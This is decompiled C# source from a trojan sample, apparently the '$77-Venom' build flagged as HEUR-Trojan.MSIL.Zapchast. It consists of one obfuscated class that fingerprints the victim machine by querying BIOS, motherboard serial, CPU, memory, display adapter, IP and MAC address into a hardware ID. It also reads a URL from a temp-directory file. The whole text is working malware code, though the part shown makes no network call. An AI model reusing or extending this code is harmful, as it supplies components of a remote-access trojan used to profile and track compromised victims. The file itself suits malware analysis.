// Decompiled with JetBrains decompiler
// Type: 㞚钷鳀콏ᯋ꩟ꇧΤ碽妗ᄠ勌Ⲭ詥要퓹䍉헱꩞祁
// Assembly: $77-Venom, Version=2.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DC8E8704-647D-4CA7-99AB-BB7BE936B486
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.01-msil\HEUR-Trojan.MSIL.Zapchast.gen-defbae45ea8e71f8a50123f382f4538afc9db836de09bab316464d4793394f19.exe

using System;
using System.IO;
using System.Linq;
using System.Management;
using System.Net.NetworkInformation;
using System.Net.Sockets;

public static class 㞚钷鳀콏ᯋ\uAA5FꇧΤ碽妗ᄠ勌Ⲭ詥要퓹䍉헱\uAA5E祁
{
  public static string HardwareId { get; private set; }

  static 㞚钷鳀콏ᯋ\uAA5FꇧΤ碽妗ᄠ勌Ⲭ詥要퓹䍉헱\uAA5E祁() => 㞚钷鳀콏ᯋ\uAA5FꇧΤ碽妗ᄠ勌Ⲭ詥要퓹䍉헱\uAA5E祁.HardwareId = ᅂ\uFFFD鐒뼶\uE9AF솓㺵떐ᄕ稓졭槑퉨胡䝼\uFFFD넂䃔\uF60B\u2295.䗾擖㽇\uF489텙恪椄嚀\uE4C8媦耨ꄵᭁ菃\uE0A0\u2F20턴濖撷㖰(㞚钷鳀콏ᯋ\uAA5FꇧΤ碽妗ᄠ勌Ⲭ詥要퓹䍉헱\uAA5E祁.탛郢憐剎\uF085㿌쭉缫ᗡ发ꀇ爙\uFFFD狣႐쫹콾挽킹լ() + 㞚钷鳀콏ᯋ\uAA5FꇧΤ碽妗ᄠ勌Ⲭ詥要퓹䍉헱\uAA5E祁.\u0C57睃鸵헼숵\u2E95㔅\uE083蠦㐂剗솯メښॐ\u2BA0睁퉕ᶍ쐋() + 㞚钷鳀콏ᯋ\uAA5FꇧΤ碽妗ᄠ勌Ⲭ詥要퓹䍉헱\uAA5E祁.멝婑\u33E6薢㓑䜭젭\uF884싌꽊쨘ꕆޟ褞欃嬵\u0DFC匜ᣓ\u2AA9());

  public static string 멝婑\u33E6薢㓑䜭젭\uF884싌꽊쨘ꕆޟ褞欃嬵\u0DFC匜ᣓ\u2AA9()
  {
    try
    {
      string empty = string.Empty;
      using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT * FROM Win32_BIOS"))
      {
        using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = managementObjectSearcher.Get().GetEnumerator())
        {
          if (enumerator.MoveNext())
            empty = enumerator.Current["Manufacturer"].ToString();
        }
      }
      return !string.IsNullOrEmpty(empty) ? empty : "N/A";
    }
    catch
    {
    }
    return "Unknown";
  }

  public static string \u0C57睃鸵헼숵\u2E95㔅\uE083蠦㐂剗솯メښॐ\u2BA0睁퉕ᶍ쐋()
  {
    try
    {
      string str = string.Empty;
      using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT * FROM Win32_BaseBoard"))
      {
        using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = managementObjectSearcher.Get().GetEnumerator())
        {
          if (enumerator.MoveNext())
          {
            ManagementObject current = (ManagementObject) enumerator.Current;
            str = current["Manufacturer"].ToString() + current["SerialNumber"].ToString();
          }
        }
      }
      return !string.IsNullOrEmpty(str) ? str : "N/A";
    }
    catch
    {
    }
    return "Unknown";
  }

  public static string 탛郢憐剎\uF085㿌쭉缫ᗡ发ꀇ爙\uFFFD狣႐쫹콾挽킹լ()
  {
    try
    {
      string input = string.Empty;
      using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT * FROM Win32_Processor"))
      {
        foreach (ManagementObject managementObject in managementObjectSearcher.Get())
          input = input + managementObject["Name"].ToString() + "; ";
      }
      string str = 랭龱䴖裷\uA4B6䄵곷კ撳\uF8EAꗋ쟋ጃՑ䅍곑갡㸱䐼瞒.潣\uF77F\uA4BEᩚ峣ې嬞觵\u0832嫥\uE57A紱㲁쫿䭯\uF101婮蚳ⷍ\u0EA4(input);
      return !string.IsNullOrEmpty(str) ? str : "N/A";
    }
    catch
    {
    }
    return "Unknown";
  }

  public static int ꖕ鳌컌히ⱻ䝵銉\uEBF2\u3304ꆝ媰补嵻融\uE2DD礘罨櫓㲒ꘞ()
  {
    try
    {
      int num = 0;
      using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * From Win32_ComputerSystem"))
      {
        using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = managementObjectSearcher.Get().GetEnumerator())
        {
          if (enumerator.MoveNext())
            num = (int) (Convert.ToDouble(enumerator.Current["TotalPhysicalMemory"]) / 1048576.0);
        }
      }
      return num;
    }
    catch
    {
      return -1;
    }
  }

  public static string 煸\u2E5E학뙧킳\u24A5\uF8C0蜢櫡뜗냴䪡鋙\uF25A瞈勓㨔柯팲䌞()
  {
    try
    {
      string input = string.Empty;
      using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT * FROM Win32_DisplayConfiguration"))
      {
        foreach (ManagementObject managementObject in managementObjectSearcher.Get())
          input = input + managementObject["Description"].ToString() + "; ";
      }
      string str = 랭龱䴖裷\uA4B6䄵곷კ撳\uF8EAꗋ쟋ጃՑ䅍곑갡㸱䐼瞒.潣\uF77F\uA4BEᩚ峣ې嬞觵\u0832嫥\uE57A紱㲁쫿䭯\uF101婮蚳ⷍ\u0EA4(input);
      return !string.IsNullOrEmpty(str) ? str : "N/A";
    }
    catch
    {
      return "Unknown";
    }
  }

  public static string 湮醓䄩Ꭰᡴ浮뻅̲㢚\u32B2ꆄ廧\uFAFF睃嚰㪰ꇷ땏ऩ셕()
  {
    foreach (NetworkInterface networkInterface in NetworkInterface.GetAllNetworkInterfaces())
    {
      if (networkInterface.GetIPProperties().GatewayAddresses.FirstOrDefault<GatewayIPAddressInformation>() != null && (networkInterface.NetworkInterfaceType == NetworkInterfaceType.Wireless80211 || networkInterface.NetworkInterfaceType == NetworkInterfaceType.Ethernet && networkInterface.OperationalStatus == OperationalStatus.Up))
      {
        foreach (UnicastIPAddressInformation unicastAddress in networkInterface.GetIPProperties().UnicastAddresses)
        {
          if (unicastAddress.Address.AddressFamily == AddressFamily.InterNetwork && unicastAddress.AddressPreferredLifetime != (long) uint.MaxValue)
            return unicastAddress.Address.ToString();
        }
      }
    }
    return "-";
  }

  public static string 堕揮옶驪\u2A6E캒ꔤ䊴䢲‍峜\u24CD衩녿뷬瑰\u0BF8\uFFFD禂丯()
  {
    foreach (NetworkInterface networkInterface in NetworkInterface.GetAllNetworkInterfaces())
    {
      if (networkInterface.NetworkInterfaceType == NetworkInterfaceType.Wireless80211 || networkInterface.NetworkInterfaceType == NetworkInterfaceType.Ethernet && networkInterface.OperationalStatus == OperationalStatus.Up)
      {
        bool flag = false;
        foreach (UnicastIPAddressInformation unicastAddress in networkInterface.GetIPProperties().UnicastAddresses)
        {
          if (unicastAddress.Address.AddressFamily == AddressFamily.InterNetwork && unicastAddress.AddressPreferredLifetime != (long) uint.MaxValue)
            flag = unicastAddress.Address.ToString() == 㞚钷鳀콏ᯋ\uAA5FꇧΤ碽妗ᄠ勌Ⲭ詥要퓹䍉헱\uAA5E祁.湮醓䄩Ꭰᡴ浮뻅̲㢚\u32B2ꆄ廧\uFAFF睃嚰㪰ꇷ땏ऩ셕();
        }
        if (flag)
          return 랭龱䴖裷\uA4B6䄵곷კ撳\uF8EAꗋ쟋ጃՑ䅍곑갡㸱䐼瞒.Ɬ㱌爫灶\u28FB폟ꌏ뢚켍海\uEBF5䍖ꇆ厜칠굮䎕嘦ꭑ᥊(networkInterface.GetPhysicalAddress().ToString());
      }
    }
    return "-";
  }

  public static string 堺㮈\uFFFD캹峌\uF3F7꽋\u28BC\uF84F\u20FB\u2192䬑뫯纬\uFFFD櫆嵿\u24CC댯\u27EE()
  {
    string str1 = File.ReadAllText(Path.Combine(Path.GetTempPath(), "url.txt").ToString());
    try
    {
      string empty = string.Empty;
      string str2 = str1;
      return !string.IsNullOrEmpty(str2) ? str2 : "N/A";
    }
    catch
    {
    }
    return "-";
  }

  public static string 㬇苊᠎ན䉈玈ꧥ잠鹕깬怜霡贳ᕼꁻ\uF782鸣ꂲƢΩ()
  {
    string str1 = File.ReadAllText(Path.Combine(Path.GetTempPath(), "url.txt").ToString());
    try
    {
      string empty = string.Empty;
      string str2 = str1;
      return !string.IsNullOrEmpty(str2) ? str2 : "N/A";
    }
    catch
    {
    }
    return "-";
  }
}
